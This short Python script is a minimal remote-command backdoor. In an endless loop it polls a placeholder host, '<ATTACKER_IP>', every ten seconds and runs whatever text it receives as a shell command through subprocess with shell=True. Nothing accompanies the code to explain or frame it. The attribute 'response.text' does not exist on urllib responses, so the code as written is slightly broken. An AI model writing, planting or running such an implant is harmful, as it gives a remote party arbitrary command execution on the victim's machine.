import time
import urllib.request
import subprocess

url = "http://<ATTACKER_IP>"

while True:
    response = urllib.request.urlopen(url)
    command = response.text.strip()

    if command:
        subprocess.call(command, shell=True)

    time.sleep(10)